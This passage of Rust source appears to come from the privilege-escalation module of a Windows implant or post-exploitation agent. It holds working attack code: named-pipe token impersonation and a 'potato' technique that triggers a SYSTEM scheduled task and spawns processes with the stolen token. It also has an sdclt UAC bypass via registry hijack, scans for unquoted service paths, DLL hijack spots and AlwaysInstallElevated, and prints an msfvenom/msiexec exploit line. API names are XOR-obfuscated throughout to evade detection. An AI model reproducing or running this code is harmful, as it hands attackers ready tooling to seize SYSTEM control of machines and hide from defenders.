    if pipe == INVALID_HANDLE_VALUE {
        unsafe { CloseHandle(event) };
        return TaskOutput::failure("pipe: CreateNamedPipe failed");
    }

    let mut ov: OVERLAPPED = unsafe { core::mem::zeroed() };
    ov.hEvent = event;
    unsafe { ConnectNamedPipe(pipe, &mut ov) };

    let adv = adv_base();
    if adv == 0 {
        unsafe { CancelIoEx(pipe, &ov) };
        let mut n = 0u32;
        unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) };
        unsafe { CloseHandle(pipe); CloseHandle(event) };
        return TaskOutput::failure("pipe: advapi32 not found");
    }

    type ImpersonatePipeFn = unsafe extern "system" fn(isize) -> i32;
    type RevertFn          = unsafe extern "system" fn() -> i32;
    type GetUserFn         = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;

    let p_imp  = unsafe { adv_fn(adv, &[0x13,0x37,0x2A,0x3F,0x28,0x29,0x35,0x34,0x3B,0x2E,0x3F,0x14,0x3B,0x37,0x3F,0x3E,0x0A,0x33,0x2A,0x3F,0x19,0x36,0x33,0x3F,0x34,0x2E,0x5A]) };
    let p_rev  = unsafe { adv_fn(adv, &[0x08,0x3F,0x2C,0x3F,0x28,0x2E,0x0E,0x35,0x09,0x3F,0x36,0x3C,0x5A]) };
    let p_user = unsafe { adv_fn(adv, &[0x1D,0x3F,0x2E,0x0F,0x29,0x3F,0x28,0x14,0x3B,0x37,0x3F,0x0D,0x5A]) };

    let (fn_imp, fn_rev, fn_user) = match (p_imp, p_rev, p_user) {
        (Some(a), Some(b), Some(c)) => (
            unsafe { core::mem::transmute::<_, ImpersonatePipeFn>(a) },
            unsafe { core::mem::transmute::<_, RevertFn>(b) },
            unsafe { core::mem::transmute::<_, GetUserFn>(c) },
        ),
        _ => {
            unsafe { CancelIoEx(pipe, &ov) };
            let mut n = 0u32;
            unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) };
            unsafe { CloseHandle(pipe); CloseHandle(event) };
            return TaskOutput::failure("pipe: fn resolve failed");
        }
    };

    // Wait up to 15 seconds for a privileged process to connect
    let wait = unsafe { WaitForSingleObject(event, 15_000) };
    if wait != WAIT_OBJECT_0 {
        // Timeout or error — cancel the pending I/O and drain it before closing
        unsafe { CancelIoEx(pipe, &ov) };
        let mut n = 0u32;
        unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) }; // bWait=TRUE
        unsafe { CloseHandle(pipe); CloseHandle(event) };
        return TaskOutput::failure(&format!(
            "pipe: 15s timeout — no client connected to {}", pipe_name
        ));
    }
    unsafe { CloseHandle(event) };

    let imp_ok = unsafe { fn_imp(pipe) };
    if imp_ok == 0 {
        unsafe { DisconnectNamedPipe(pipe); CloseHandle(pipe) };
        return TaskOutput::failure("pipe: ImpersonateNamedPipeClient failed");
    }

    let mut uname = [0u16; 256];
    let mut ulen = 256u32;
    let _ = unsafe { fn_user(uname.as_mut_ptr(), &mut ulen) };
    let who = if ulen > 1 { String::from_utf16_lossy(&uname[..ulen as usize - 1]) } else { "unknown".into() };

    unsafe { fn_rev() };
    unsafe { DisconnectNamedPipe(pipe); CloseHandle(pipe) };

    TaskOutput::success(format!("pipe: impersonated {who} via {}", pipe_name).into_bytes())
}

#[cfg(target_os = "windows")]
fn rand_u32() -> u32 {
    use windows_sys::Win32::System::SystemInformation::GetTickCount64;
    unsafe { GetTickCount64() as u32 ^ (std::process::id() << 8) }
}

// ── UAC bypass — sdclt ────────────────────────────────────────────────────────
//
// Writes cmd to HKCU App Paths control.exe entry, launches sdclt.exe (auto-elevates),
// which calls control.exe (redirected to our payload) elevated.

#[cfg(target_os = "windows")]
fn uac_sdclt(v: &serde_json::Value) -> TaskOutput {
    let cmd = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c.to_string(),
        None    => return TaskOutput::failure("uac-sdclt: missing cmd"),
    };

    let subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe";
    if let Err(e) = reg_set_key_value(subkey, "", &cmd) {
        return TaskOutput::failure(&format!("uac-sdclt: reg write failed: {e}"));
    }

    let result = shell_execute_ex_system32("sdclt.exe");
    std::thread::sleep(std::time::Duration::from_millis(3000));
    reg_delete_key(subkey);

    match result {
        Ok(()) => TaskOutput::success(b"uac-sdclt: payload launched".to_vec()),
        Err(e)  => TaskOutput::failure(&format!("uac-sdclt: ShellExecuteExW failed err={e:#010x}")),
    }
}

// ── Service misconfig: unquoted service paths ─────────────────────────────────

#[cfg(target_os = "windows")]
fn enum_unquoted_paths() -> TaskOutput {
    use windows_sys::Win32::System::Registry::{
        RegOpenKeyExA, RegEnumKeyExA, RegQueryValueExA, RegCloseKey,
    };

    let key_path = "SYSTEM\\CurrentControlSet\\Services";
    const HKLM: isize = -2147483646isize;
    const KEY_READ: u32 = 0x20019;

    let root_cstr = std::ffi::CString::new(key_path).unwrap();
    let mut h_root: isize = 0;
    if unsafe { RegOpenKeyExA(HKLM, root_cstr.as_ptr() as *const u8, 0, KEY_READ, &mut h_root) } != 0 {
        return TaskOutput::failure("unquoted-paths: cannot open Services key");
    }

    let mut out = String::from("Unquoted service paths (potential hijack):\n\n");
    let mut found = 0usize;
    let mut idx = 0u32;

    loop {
        let mut name_buf = [0u8; 260];
        let mut name_len = 260u32;
        let r = unsafe { RegEnumKeyExA(h_root, idx, name_buf.as_mut_ptr(), &mut name_len,
            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut()) };
        if r != 0 { break; }
        idx += 1;

        let svc_name = match std::str::from_utf8(&name_buf[..name_len as usize]) {
            Ok(s) => s.to_string(),
            Err(_) => continue,
        };

        let sub = format!("{}\\{}\0", key_path, svc_name);
        let mut h_svc: isize = 0;
        if unsafe { RegOpenKeyExA(HKLM, sub.as_ptr(), 0, KEY_READ, &mut h_svc) } != 0 { continue; }

        let val_name = b"ImagePath\0";
        let mut val_type: u32 = 0;
        let mut data_buf = vec![0u8; 1024];
        let mut data_len = data_buf.len() as u32;
        let r3 = unsafe { RegQueryValueExA(h_svc, val_name.as_ptr(), core::ptr::null_mut(),
            &mut val_type, data_buf.as_mut_ptr(), &mut data_len) };
        unsafe { RegCloseKey(h_svc) };
        if r3 != 0 { continue; }

        let path_raw = String::from_utf8_lossy(&data_buf[..data_len.saturating_sub(1) as usize]).to_string();
        let path = path_raw.trim().trim_start_matches('"').trim_start_matches('\'');

        if !path_raw.trim().starts_with('"') && path.contains(' ') && (path.starts_with("C:\\") || path.starts_with("c:\\")) {
            let parts: Vec<&str> = path.split(' ').collect();
            if parts.len() > 1 {
                found += 1;
                out.push_str(&format!("Service: {svc_name}\n  Path:  {path_raw}\n"));
                let mut acc = String::new();
                for part in &parts[..parts.len()-1] {
                    if !acc.is_empty() { acc.push(' '); }
                    acc.push_str(part);
                    out.push_str(&format!("  Hijack candidate: {acc}.exe\n"));
                }
                out.push('\n');
            }
        }
    }

    unsafe { RegCloseKey(h_root) };
    if found == 0 { out.push_str("No unquoted service paths found.\n"); }
    TaskOutput::success(out.into_bytes())
}

// ── DLL hijacking opportunities ───────────────────────────────────────────────
//
// Enumerates directories in %PATH% and checks for writable ones.
// Also checks for known-vulnerable application install directories.

#[cfg(target_os = "windows")]
fn enum_dll_hijack() -> TaskOutput {
    let mut out = String::from("DLL hijacking candidates:\n\n");

    // Check PATH directories for write access
    let path_env = std::env::var("PATH").unwrap_or_default();
    out.push_str("=== Writable PATH directories ===\n");
    let mut writable_count = 0;
    for dir in path_env.split(';') {
        let dir = dir.trim();
        if dir.is_empty() { continue; }
        // Try to create a temp file in the directory to test writability
        let test_path = format!("{}\\~dmt{:08x}.tmp", dir, rand_u32());
        if std::fs::write(&test_path, b"x").is_ok() {
            let _ = std::fs::remove_file(&test_path);
            out.push_str(&format!("  WRITABLE: {dir}\n"));
            writable_count += 1;
        }
    }
    if writable_count == 0 {
        out.push_str("  None found.\n");
    }

    // Check for common known-vulnerable DLL search order locations
    out.push_str("\n=== Known DLL hijack targets ===\n");
    let candidates = [
        ("C:\\Python27\\", "python27.dll"),
        ("C:\\Python3\\", "python3.dll"),
        ("C:\\Program Files\\Git\\", "winmm.dll"),
        ("C:\\Program Files\\Wireshark\\", "airpcap.dll"),
        ("C:\\Program Files (x86)\\Notepad++\\", "dbghelp.dll"),
    ];
    for (app_dir, dll) in &candidates {
        if std::path::Path::new(app_dir).exists() {
            let target = format!("{}{}", app_dir, dll);
            if !std::path::Path::new(&target).exists() {
                out.push_str(&format!("  {target} (missing, app dir exists)\n"));
            }
        }
    }

    // Check CWD writability (always interesting)
    if let Ok(cwd) = std::env::current_dir() {
        let test = cwd.join(format!("~dmt{:08x}.tmp", rand_u32()));
        if std::fs::write(&test, b"x").is_ok() {
            let _ = std::fs::remove_file(&test);
            out.push_str(&format!("\n  CWD writable: {}\n", cwd.display()));
        }
    }

    TaskOutput::success(out.into_bytes())
}

// ── AlwaysInstallElevated check ───────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn check_always_install_elevated() -> TaskOutput {
    let hklm_val = reg_read_dword_hklm(
        "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        "AlwaysInstallElevated",
    );
    let hkcu_val = reg_read_dword_hkcu(
        "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        "AlwaysInstallElevated",
    );

    let mut out = String::new();
    out.push_str(&format!("HKLM AlwaysInstallElevated: {}\n", hklm_val.unwrap_or(0)));
    out.push_str(&format!("HKCU AlwaysInstallElevated: {}\n", hkcu_val.unwrap_or(0)));

    if hklm_val == Some(1) && hkcu_val == Some(1) {
        out.push_str("\n[VULNERABLE] AlwaysInstallElevated is enabled in both hives.\n");
        out.push_str("Any user can install MSI packages as SYSTEM.\n");
        out.push_str("Exploit: msfvenom -p windows/x64/exec CMD=<payload> -f msi > pwn.msi && msiexec /quiet /qn /i pwn.msi\n");
    } else {
        out.push_str("\nNot vulnerable (requires 1 in both HKLM and HKCU).\n");
    }

    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn reg_read_dword_hklm(subkey: &str, value: &str) -> Option<u32> {
    reg_read_dword(-2147483646isize, subkey, value)
}

#[cfg(target_os = "windows")]
fn reg_read_dword_hkcu(subkey: &str, value: &str) -> Option<u32> {
    reg_read_dword(-2147483647isize, subkey, value)
}

#[cfg(target_os = "windows")]
fn reg_read_dword(hive: isize, subkey: &str, value: &str) -> Option<u32> {
    use windows_sys::Win32::System::Registry::{RegOpenKeyExA, RegQueryValueExA, RegCloseKey};
    const KEY_READ: u32 = 0x20019;
    const REG_DWORD: u32 = 4;

    let sub = std::ffi::CString::new(subkey).ok()?;
    let val = std::ffi::CString::new(value).ok()?;
    let mut hkey: isize = 0;
    if unsafe { RegOpenKeyExA(hive, sub.as_ptr() as *const u8, 0, KEY_READ, &mut hkey) } != 0 { return None; }

    let mut typ: u32 = 0;
    let mut data: u32 = 0;
    let mut len: u32 = 4;
    let r = unsafe { RegQueryValueExA(hkey, val.as_ptr() as *const u8, core::ptr::null_mut(),
        &mut typ, &mut data as *mut u32 as *mut u8, &mut len) };
    unsafe { RegCloseKey(hkey) };

    if r != 0 || typ != REG_DWORD { return None; }
    Some(data)
}

// ── Potato — SeImpersonatePrivilege → SYSTEM via named pipe + schtasks ────────
//
// When running under a service account (IIS, MSSQL, COM server, etc.) with
// SeImpersonatePrivilege but without SeDebugPrivilege, token-steal is impossible.
// This technique instead:
//   1. Creates a named pipe server with overlapped I/O
//   2. Schedules a transient SYSTEM task (schtasks) that reads from the pipe
//   3. ImpersonateNamedPipeClient → SYSTEM token
//   4. DuplicateTokenEx + CreateProcessWithTokenW (if cmd given) or impersonates
// args: {"method":"potato", "cmd":"<optional cmd to run as SYSTEM>"}

#[cfg(target_os = "windows")]
fn potato(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::IO::{CancelIoEx, GetOverlappedResult, OVERLAPPED};
    use windows_sys::Win32::System::Pipes::{
        ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe,
        PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT,
    };
    use windows_sys::Win32::System::Threading::{CreateEventA, WaitForSingleObject};
    const PIPE_ACCESS_DUPLEX:   u32 = 3;
    const FILE_FLAG_OVERLAPPED: u32 = 0x4000_0000;
    const WAIT_OBJECT_0:        u32 = 0;

    let spawn_cmd = v.get("cmd").and_then(|s| s.as_str()).map(String::from);

    if !has_impersonate_privilege() {
        return TaskOutput::failure("potato: SeImpersonatePrivilege not held (not a service account?)");
    }

    let rand = rand_u32();
    let pipe_path = format!("\\\\.\\pipe\\dm_{:08x}\0", rand);
    let pipe_unc  = format!("\\\\.\\pipe\\dm_{:08x}", rand);
    let task_name = format!("dm_p{:08x}", rand);

    let event = unsafe { CreateEventA(core::ptr::null(), 1, 0, core::ptr::null()) };
    if event == 0 { return TaskOutput::failure("potato: CreateEvent failed"); }

    let pipe = unsafe {
        CreateNamedPipeA(
            pipe_path.as_ptr(),
            PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 512, 512, 0, core::ptr::null(),
        )
    };
    if pipe == INVALID_HANDLE_VALUE {
        unsafe { CloseHandle(event) };
        return TaskOutput::failure("potato: CreateNamedPipe failed");
    }

    let mut ov: OVERLAPPED = unsafe { core::mem::zeroed() };
    ov.hEvent = event;
    unsafe { ConnectNamedPipe(pipe, &mut ov) };

    // Trigger SYSTEM task to connect to our pipe (cmd /c type opens it as a client)
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    let _ = std::process::Command::new("cmd")
        .args(["/C", &format!(
            "schtasks /Create /F /TN \"{}\" /TR \"cmd /c type {}\" /SC ONCE /ST 00:00 /RU SYSTEM",
            task_name, pipe_unc)])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    let _ = std::process::Command::new("cmd")
        .args(["/C", &format!("schtasks /Run /TN \"{}\"", task_name)])
        .creation_flags(CREATE_NO_WINDOW)
        .output();

    let wait = unsafe { WaitForSingleObject(event, 12_000) };

    // Delete task regardless of outcome
    let _ = std::process::Command::new("cmd")
        .args(["/C", &format!("schtasks /Delete /F /TN \"{}\"", task_name)])
        .creation_flags(CREATE_NO_WINDOW)
        .output();

    if wait != WAIT_OBJECT_0 {
        unsafe { CancelIoEx(pipe, &ov) };
        let mut n = 0u32;
        unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) };
        unsafe { CloseHandle(pipe); CloseHandle(event) };
        return TaskOutput::failure("potato: timeout — SYSTEM did not connect to pipe");
    }
    unsafe { CloseHandle(event) };

    let adv = adv_base();
    if adv == 0 {
        unsafe { DisconnectNamedPipe(pipe); CloseHandle(pipe) };
        return TaskOutput::failure("potato: advapi32 not found");
    }

    type ImpersonatePipeFn      = unsafe extern "system" fn(isize) -> i32;
    type OpenThreadTokenFn      = unsafe extern "system" fn(isize, u32, u32, *mut isize) -> i32;
    type DuplicateTokenExFn     = unsafe extern "system" fn(isize, u32, *mut u8, u32, u32, *mut isize) -> i32;
    type CreateProcWithTokenFn  = unsafe extern "system" fn(isize, u32, *const u16, *mut u16, u32, *mut u8, *const u16, *mut u8, *mut u8) -> i32;
    type GetUserNameWFn         = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;
    type RevertFn               = unsafe extern "system" fn() -> i32;

    // ImpersonateNamedPipeClient\0 XOR 0x5A (same bytes as pipe_impersonate)
    let p_imp  = unsafe { adv_fn(adv, &[0x13,0x37,0x2A,0x3F,0x28,0x29,0x35,0x34,0x3B,0x2E,0x3F,0x14,0x3B,0x37,0x3F,0x3E,0x0A,0x33,0x2A,0x3F,0x19,0x36,0x33,0x3F,0x34,0x2E,0x5A]) };
    // OpenThreadToken\0 XOR 0x5A
    let p_ott  = unsafe { adv_fn(adv, &[0x15,0x2A,0x3F,0x34,0x0E,0x32,0x28,0x3F,0x3B,0x3E,0x0E,0x35,0x31,0x3F,0x34,0x5A]) };
    // DuplicateTokenEx\0 XOR 0x5A
    let p_dup  = unsafe { adv_fn(adv, &[0x1E,0x2F,0x2A,0x36,0x33,0x39,0x3B,0x2E,0x3F,0x0E,0x35,0x31,0x3F,0x34,0x1F,0x22,0x5A]) };
    // CreateProcessWithTokenW\0 XOR 0x5A
    let p_cpwt = unsafe { adv_fn(adv, &[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x0D,0x33,0x2E,0x32,0x0E,0x35,0x31,0x3F,0x34,0x0D,0x5A]) };
    // GetUserNameW\0 XOR 0x5A
    let p_user = unsafe { adv_fn(adv, &[0x1D,0x3F,0x2E,0x0F,0x29,0x3F,0x28,0x14,0x3B,0x37,0x3F,0x0D,0x5A]) };
    // RevertToSelf\0 XOR 0x5A
    let p_rev  = unsafe { adv_fn(adv, &[0x08,0x3F,0x2C,0x3F,0x28,0x2E,0x0E,0x35,0x09,0x3F,0x36,0x3C,0x5A]) };

    let (fn_imp, fn_ott, fn_dup, fn_user, fn_rev) = match (p_imp, p_ott, p_dup, p_user, p_rev) {
        (Some(a), Some(b), Some(c), Some(d), Some(e)) => unsafe {(
            core::mem::transmute::<_, ImpersonatePipeFn>(a),
            core::mem::transmute::<_, OpenThreadTokenFn>(b),
            core::mem::transmute::<_, DuplicateTokenExFn>(c),
            core::mem::transmute::<_, GetUserNameWFn>(d),
            core::mem::transmute::<_, RevertFn>(e),
        )},
        _ => {
            unsafe { DisconnectNamedPipe(pipe); CloseHandle(pipe) };
            return TaskOutput::failure("potato: fn resolve failed");
        }
    };

    if unsafe { fn_imp(pipe) } == 0 {
        unsafe { DisconnectNamedPipe(pipe); CloseHandle(pipe) };
        return TaskOutput::failure("potato: ImpersonateNamedPipeClient failed");
    }

    let result = if let (Some(cmd), Some(cpwt_ptr)) = (spawn_cmd, p_cpwt) {
        // Promote impersonation token to primary and spawn
        let mut thread_tok: isize = 0;
        const TOKEN_DUPLICATE: u32 = 0x0002;
        const TOKEN_QUERY:     u32 = 0x0008;
        if unsafe { fn_ott(-2isize, TOKEN_DUPLICATE | TOKEN_QUERY, 1, &mut thread_tok) } == 0
            || thread_tok == 0
        {
            unsafe { fn_rev(); DisconnectNamedPipe(pipe); CloseHandle(pipe) };
            return TaskOutput::failure("potato: OpenThreadToken failed");
        }
        let mut primary: isize = 0;
        const TOKEN_ALL_ACCESS:        u32 = 0xF01FF;
        const SECURITY_IMPERSONATION:  u32 = 2;
        const TOKEN_PRIMARY:           u32 = 1;
        if unsafe { fn_dup(thread_tok, TOKEN_ALL_ACCESS, core::ptr::null_mut(),
            SECURITY_IMPERSONATION, TOKEN_PRIMARY, &mut primary) } == 0
        {
            unsafe { CloseHandle(thread_tok); fn_rev(); DisconnectNamedPipe(pipe); CloseHandle(pipe) };
            return TaskOutput::failure("potato: DuplicateTokenEx failed");
        }
        unsafe { CloseHandle(thread_tok) };

        let fn_cpwt: CreateProcWithTokenFn = unsafe { core::mem::transmute(cpwt_ptr) };
        let mut cmdline: Vec<u16> = cmd.encode_utf16().chain(core::iter::once(0)).collect();
        use windows_sys::Win32::System::Threading::{PROCESS_INFORMATION, STARTUPINFOW};
        let mut si: STARTUPINFOW = unsafe { core::mem::zeroed() };
        si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
        let ok = unsafe { fn_cpwt(primary, 0, core::ptr::null(), cmdline.as_mut_ptr(),
            CREATE_NO_WINDOW, core::ptr::null_mut(), core::ptr::null(),
            &mut si as *mut _ as *mut u8, &mut pi as *mut _ as *mut u8) };
        unsafe { CloseHandle(primary) };
        if ok == 0 {
            unsafe { fn_rev(); DisconnectNamedPipe(pipe); CloseHandle(pipe) };
            return TaskOutput::failure("potato: CreateProcessWithTokenW failed");
        }
        unsafe { CloseHandle(pi.hProcess); CloseHandle(pi.hThread) };
        let msg = format!("potato: SYSTEM process spawned (pid {})", pi.dwProcessId);
        unsafe { fn_rev(); DisconnectNamedPipe(pipe); CloseHandle(pipe) };
        TaskOutput::success(msg.into_bytes())
    } else {
        let mut uname = [0u16; 256];
        let mut ulen = 256u32;
        let _ = unsafe { fn_user(uname.as_mut_ptr(), &mut ulen) };
        let who = if ulen > 1 { String::from_utf16_lossy(&uname[..ulen as usize - 1]) } else { "?".into() };
        unsafe { fn_rev(); DisconnectNamedPipe(pipe); CloseHandle(pipe) };
        TaskOutput::success(format!("potato: impersonating {} (schtasks trigger)", who).into_bytes())
    };
    result
}

#[cfg(target_os = "windows")]
fn has_impersonate_privilege() -> bool {
    let adv = adv_base();
    if adv == 0 { return false; }

    type OpenProcessTokenFn = unsafe extern "system" fn(isize, u32, *mut isize) -> i32;
    type PrivilegeCheckFn   = unsafe extern "system" fn(isize, *mut u8, *mut i32) -> i32;

    // OpenProcessToken\0 XOR 0x5A
    let p_opt = unsafe { adv_fn(adv, &[0x15,0x2A,0x3F,0x34,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x0E,0x35,0x31,0x3F,0x34,0x5A]) };
    // PrivilegeCheck\0 XOR 0x5A
    let p_pc  = unsafe { adv_fn(adv, &[0x0A,0x28,0x33,0x2C,0x33,0x36,0x3F,0x3D,0x3F,0x19,0x32,0x3F,0x39,0x31,0x5A]) };

    let (fn_opt, fn_pc) = match (p_opt, p_pc) {
        (Some(a), Some(b)) => unsafe {(
            core::mem::transmute::<_, OpenProcessTokenFn>(a),
            core::mem::transmute::<_, PrivilegeCheckFn>(b),
        )},
        _ => return false,
    };

    let mut token: isize = 0;
    if unsafe { fn_opt(-1isize, 0x0020, &mut token) } == 0 { return false; }

    #[repr(C)]
    struct PrivSet { count: u32, control: u32, luid_lo: u32, luid_hi: u32, attrs: u32 }
    let mut ps = PrivSet { count: 1, control: 1, luid_lo: 29, luid_hi: 0, attrs: 0x3 };
    let mut result: i32 = 0;
    unsafe { fn_pc(token, &mut ps as *mut _ as *mut u8, &mut result) };
    unsafe { windows_sys::Win32::Foundation::CloseHandle(token) };
    result != 0
}

// ── Shared LDAP loader (privesc module) ───────────────────────────────────────

#[cfg(target_os = "windows")]
fn wldap_base() -> Result<usize, String> {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
    let mut b = crate::loader::get_module_base(
        crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    ) as usize;
    if b == 0 {
        let n = crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
        b = unsafe { LoadLibraryA(n.as_ptr()) } as usize;
    }
    if b == 0 { Err("Wldap32 not found".into()) } else { Ok(b) }
}

#[cfg(target_os = "windows")]
fn ldap_query_list(wldap: usize, dc: &str, base_dn: &str, filter: &str, attrs: &[&str])
    -> Result<Vec<(String, Vec<(String, Vec<String>)>)>, String>
{
    type LdapInitFn    = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
    type LdapSetOptFn  = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
    type LdapBindFn    = unsafe extern "system" fn(*mut u8, *const u8, *const u8, u32) -> u32;
    type LdapSearchFn  = unsafe extern "system" fn(*mut u8,*const u8,i32,*const u8,*const *const u8,i32,*mut *mut u8) -> u32;
    type LdapFirstFn   = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapNextFn    = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapGetDnFn   = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapMemFreeFn = unsafe extern "system" fn(*mut u8);
    type LdapGetValsFn = unsafe extern "system" fn(*mut u8, *mut u8, *const u8) -> *mut *mut u8;
    type LdapGetLenFn  = unsafe extern "system" fn(*mut u8, *mut u8, *const u8) -> *mut *mut u8;
    type LdapValFreeFn = unsafe extern "system" fn(*mut *mut u8) -> u32;
    type LdapLenFreeFn = unsafe extern "system" fn(*mut *mut u8) -> u32;
    type LdapMsgFreeFn = unsafe extern "system" fn(*mut u8) -> u32;
    type LdapUnbindFn  = unsafe extern "system" fn(*mut u8) -> u32;
    type LdapModifyFn  = unsafe extern "system" fn(*mut u8,*const u8,*const *const u8) -> u32;

    macro_rules! wl { ($enc:expr, $ty:ty) => {{
        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
            None    => return Err("wldap fn not found".into()),
        }
    }}}

    let fn_init      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
    let fn_setopt    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
    let fn_bind      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x18,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
    let fn_search    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
    let fn_first     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
    let fn_next      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
    let fn_getdn     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x3E,0x34,0x5A], LdapGetDnFn);
    let fn_memfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x3F,0x37,0x3C,0x28,0x3F,0x3F,0x5A], LdapMemFreeFn);
    let fn_getvals   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x5A], LdapGetValsFn);
    let fn_getlenvals= wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x05,0x36,0x3F,0x34,0x5A], LdapGetLenFn);
    let fn_valfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x5A], LdapValFreeFn);
    let fn_lenfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x05,0x36,0x3F,0x34,0x5A], LdapLenFreeFn);
    let fn_msgfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
    let fn_unbind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x18,0x33,0x34,0x3E,0x5A], LdapUnbindFn);

    let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
    let ld = unsafe { fn_init(dc_b.as_ptr(), 389) };
    if ld.is_null() { return Err("ldap_init failed".into()); }
    let ver: u32 = 3;
    unsafe { fn_setopt(ld, 0x11, &ver as *const u32 as *const u8) };
    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
    if br != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_bind: {br:#x}")); }

    let base_b:   Vec<u8> = base_dn.bytes().chain(core::iter::once(0u8)).collect();
    let filter_b: Vec<u8> = filter.bytes().chain(core::iter::once(0u8)).collect();
    let attr_bufs: Vec<Vec<u8>> = attrs.iter()
        .map(|a| a.bytes().chain(core::iter::once(0u8)).collect())
        .collect();
    let mut attr_ptrs: Vec<*const u8> = attr_bufs.iter().map(|b| b.as_ptr()).collect();
    attr_ptrs.push(core::ptr::null());

    let mut res_msg: *mut u8 = core::ptr::null_mut();
    let sr = unsafe {
        fn_search(ld, base_b.as_ptr(), 2, filter_b.as_ptr(), attr_ptrs.as_ptr(), 0, &mut res_msg)
    };
    if sr != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_search: {sr:#x}")); }

    let mut results: Vec<(String, Vec<(String, Vec<String>)>)> = Vec::new();
    let mut entry = unsafe { fn_first(ld, res_msg) };
    while !entry.is_null() {
        let dn_ptr = unsafe { fn_getdn(ld, entry) };
        let dn = if dn_ptr.is_null() { String::new() } else {
            let s = unsafe { std::ffi::CStr::from_ptr(dn_ptr as *const i8) }
                .to_string_lossy().to_string();
            unsafe { fn_memfree(dn_ptr) };
            s
        };
        let mut obj_attrs: Vec<(String, Vec<String>)> = Vec::new();
        for ab in attr_bufs.iter() {
            let aname = String::from_utf8_lossy(&ab[..ab.len()-1]).to_string();
            let vals = unsafe { fn_getvals(ld, entry, ab.as_ptr()) };
            if !vals.is_null() {
                let mut sv: Vec<String> = Vec::new();
                let mut i = 0usize;
                loop {
                    let vp = unsafe { *vals.add(i) };
                    if vp.is_null() { break; }
                    sv.push(unsafe { std::ffi::CStr::from_ptr(vp as *const i8) }
                        .to_string_lossy().to_string());
                    i += 1;
                }
                unsafe { fn_valfree(vals) };
                if !sv.is_empty() { obj_attrs.push((aname, sv)); continue; }
            }
            let bvals = unsafe { fn_getlenvals(ld, entry, ab.as_ptr()) };
            if !bvals.is_null() {
